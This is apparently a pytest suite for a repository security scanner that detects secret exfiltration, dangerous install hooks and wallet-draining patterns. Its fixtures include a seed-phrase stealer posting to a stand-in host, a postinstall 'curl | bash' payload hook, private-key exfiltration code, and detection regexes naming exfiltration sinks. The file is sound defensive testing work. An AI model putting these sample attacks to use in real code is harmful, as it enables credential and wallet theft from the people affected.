from trust_auditor.scanner import scan_text


def ids(findings):
    return {f.rule_id for f in findings}


def test_secret_to_network_is_critical():
    code = '''
seed_phrase = input("Enter seed phrase: ")
import requests
requests.post("https://example.invalid/collect", json={"seed": seed_phrase})
'''
    findings = scan_text("owner/repo", "stealer.py", code)
    assert "SECRET_TO_NETWORK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "SECRET_TO_NETWORK")
    assert all("correct horse" not in f.evidence for f in findings)


def test_install_hook_alarm():
    package = '''{
      "name":"x",
      "scripts":{"postinstall":"curl https://example.invalid/payload | bash"}
    }'''
    findings = scan_text("owner/repo", "package.json", package)
    assert "DANGEROUS_INSTALL_HOOK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "DANGEROUS_INSTALL_HOOK")


def test_unlimited_approval_warns():
    code = 'token.approve(spender, MaxUint256);'
    findings = scan_text("owner/repo", "approve.js", code)
    assert "UNLIMITED_APPROVAL" in ids(findings)


def test_plain_http_client_not_automatically_critical():
    code = 'import requests\nresponse = requests.post("https://api.example.invalid/status", json={"ping": 1})\n'
    findings = scan_text("owner/repo", "client.py", code)
    assert not any(f.severity == "CRITICAL" for f in findings)


def test_secret_values_are_redacted():
    code = 'private_key = "' + ("a" * 64) + '"'
    findings = scan_text("owner/repo", "config.py", code)
    critical = [f for f in findings if f.rule_id == "HARDCODED_EVM_KEY"]
    assert critical
    assert critical[0].evidence == "[REDACTED POTENTIAL SECRET]"



def test_detector_definitions_do_not_self_trigger_exfiltration():
    code = r'''
SENSITIVE_SOURCE = _rx(r"(?:private[_ -]?key|secret[_ -]?key|seed[_ -]?phrase|mnemonic|password|passphrase|api[_ -]?key|auth[_ -]?token|session[_ -]?cookie|document\.cookie|clipboard)")
NETWORK_SINK = _rx(r"(?:requests\.post|axios\.post|fetch\s*\(|http\.post|https\.request|webhook|api\.telegram\.org|discord(?:app)?\.com/api/webhooks)")
'''
    findings = scan_text("owner/repo", "scanner.py", code)
    assert "SECRET_TO_NETWORK" not in ids(findings)
    assert "SENSITIVE_DATA_WITH_NETWORK" not in ids(findings)



def test_unrelated_sensitive_storage_and_network_call_are_not_exfiltration():
    code = """
cache_key = "gta_audit_keys_v3"
localStorage.setItem(cache_key, "recent")
response = requests.get("https://api.github.com/repos/example/project")
"""
    findings = scan_text("owner/repo", "cache.py", code)
    assert "SECRET_TO_NETWORK" not in ids(findings)


def test_scanner_rule_catalog_does_not_trigger_its_own_rules():
    code = r'''
Rule("UNLIMITED_APPROVAL", "HIGH", "wallet-permission", _rx(r"(?:approve|allowance|permit)[^\\n]{0,180}(?:MaxUint256|MAX_UINT)"), "Possible unlimited token approval/permit")
'''
    findings = scan_text("owner/repo", "trust_auditor/scanner.py", code)
    assert "UNLIMITED_APPROVAL" not in ids(findings)


def test_documentation_and_test_fixtures_do_not_score_behavior_examples():
    doc = 'Never enter a seed phrase. Example: requests.post("https://example.invalid", json={"seed": seed_phrase})'
    test = 'seed_phrase = input("Enter seed phrase: ")\\nrequests.post("https://example.invalid", json={"seed": seed_phrase})'
    assert not scan_text("owner/repo", "README.md", doc)
    assert not scan_text("owner/repo", "tests/test_example.py", test)



def test_generic_session_storage_flag_is_not_credential_access():
    code = """
sessionStorage.getItem("gta_visit_counted_v2")
sessionStorage.setItem("gta_visit_counted_v2", "1")
localStorage.getItem("gta_audit_keys_v3")
"""
    findings = scan_text("owner/repo", "engagement_stats.py", code)
    assert "BROWSER_STORAGE_TOKEN" not in ids(findings)


def test_explicit_auth_storage_key_is_still_flagged():
    code = 'localStorage.setItem("github_auth_token", token)'
    findings = scan_text("owner/repo", "app.js", code)
    assert "BROWSER_STORAGE_TOKEN" in ids(findings)

def test_expected_github_token_environment_access_is_not_a_finding():
    code = 'token = os.getenv("GITHUB_TOKEN")'
    assert "ENV_SECRET_READ" not in ids(scan_text("owner/repo", "client.py", code))


def test_other_sensitive_environment_access_remains_flagged():
    code = 'key = os.getenv("PRIVATE_KEY")'
    assert "ENV_SECRET_READ" in ids(scan_text("owner/repo", "client.py", code))


def test_same_origin_post_is_not_reported_as_outbound_networking():
    code = 'fetch("/api/audit", { method: "POST", body: JSON.stringify({target}) })'
    assert "OUTBOUND_POST" not in ids(scan_text("owner/repo", "app.js", code))


def test_external_post_remains_flagged():
    code = 'fetch("https://collector.example.invalid", { method: "POST", body: payload })'
    assert "OUTBOUND_POST" in ids(scan_text("owner/repo", "app.js", code))


def test_plain_share_clipboard_helper_is_not_reported_as_clipboard_write_risk():
    code = 'async function gtaCopy(text){await navigator.clipboard.writeText(text)}'
    assert "CLIPBOARD_WRITE" not in ids(scan_text("owner/repo", "share.js", code))


def test_wallet_address_clipboard_write_remains_flagged():
    code = 'navigator.clipboard.writeText(replacementWalletAddress)'
    assert "CLIPBOARD_WRITE" in ids(scan_text("owner/repo", "wallet.js", code))



def test_browser_password_form_sent_to_network_is_flagged_conservatively():
    code = '''
const password = document.querySelector("#password").value;
fetch("https://api.example.invalid/login", {
  method: "POST",
  body: JSON.stringify({ password })
});
'''
    findings = scan_text("owner/repo", "login.js", code)
    form_flow = [f for f in findings if f.rule_id == "SENSITIVE_FORM_TO_NETWORK"]
    assert form_flow
    assert form_flow[0].severity == "HIGH"
    assert form_flow[0].confidence == "medium"
    assert form_flow[0].evidence == "[REDACTED SENSITIVE FLOW CONTEXT]"
    assert "SECRET_TO_NETWORK" not in ids(findings)


def test_ordinary_search_form_value_is_not_treated_as_secret_exfiltration():
    code = '''
const query = document.querySelector("#search").value;
fetch("https://api.example.invalid/search", {
  method: "POST",
  body: JSON.stringify({ query })
});
'''
    findings = scan_text("owner/repo", "search.js", code)
    assert "SENSITIVE_FORM_TO_NETWORK" not in ids(findings)
    assert "SECRET_TO_NETWORK" not in ids(findings)


def test_sensitive_variable_used_after_unrelated_network_call_is_not_exfiltration():
    code = '''
const password = document.querySelector("#password").value;
fetch("https://metrics.example.invalid/ping", {
  method: "POST",
  body: JSON.stringify({ event: "login_view" })
});
console.log("password field length", password.length);
'''
    findings = scan_text("owner/repo", "login.js", code)
    assert "SENSITIVE_FORM_TO_NETWORK" not in ids(findings)
    assert "SECRET_TO_NETWORK" not in ids(findings)


def test_sensitive_variable_inside_nested_network_payload_is_detected():
    code = '''
const privateKey = process.env.PRIVATE_KEY;
await fetch("https://collector.example.invalid/submit", {
  method: "POST",
  body: JSON.stringify({ credentials: { key: privateKey } })
});
'''
    findings = scan_text("owner/repo", "worker.js", code)
    assert "SECRET_TO_NETWORK" in ids(findings)
    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "SECRET_TO_NETWORK")

def test_get_element_by_id_password_flow_is_detected():
    code = '''
const password = document.getElementById("password").value;
fetch("https://api.example.invalid/login", {
  method: "POST",
  body: JSON.stringify({ password })
});
'''
    findings = scan_text("owner/repo", "login.js", code)
    assert "SENSITIVE_FORM_TO_NETWORK" in ids(findings)


def test_form_elements_password_flow_is_detected():
    code = '''
const password = form.elements["password"].value;
axios.post("https://api.example.invalid/login", { password });
'''
    findings = scan_text("owner/repo", "login.js", code)
    assert "SENSITIVE_FORM_TO_NETWORK" in ids(findings)


def test_sensitive_value_sent_through_local_payload_alias_is_detected():
    code = '''
const privateKey = process.env.PRIVATE_KEY;
const payload = JSON.stringify({ credentials: { key: privateKey } });
fetch("https://collector.example.invalid/submit", {
  method: "POST",
  body: payload
});
'''
    findings = scan_text("owner/repo", "worker.js", code)
    assert "SECRET_TO_NETWORK" in ids(findings)


def test_sensitive_alias_used_only_in_unrelated_code_is_not_exfiltration():
    code = '''
const password = document.querySelector("#password").value;
const localCopy = password;
fetch("https://metrics.example.invalid/ping", {
  method: "POST",
  body: JSON.stringify({ event: "login_view" })
});
console.log(localCopy.length);
'''
    findings = scan_text("owner/repo", "login.js", code)
    assert "SENSITIVE_FORM_TO_NETWORK" not in ids(findings)
    assert "SECRET_TO_NETWORK" not in ids(findings)
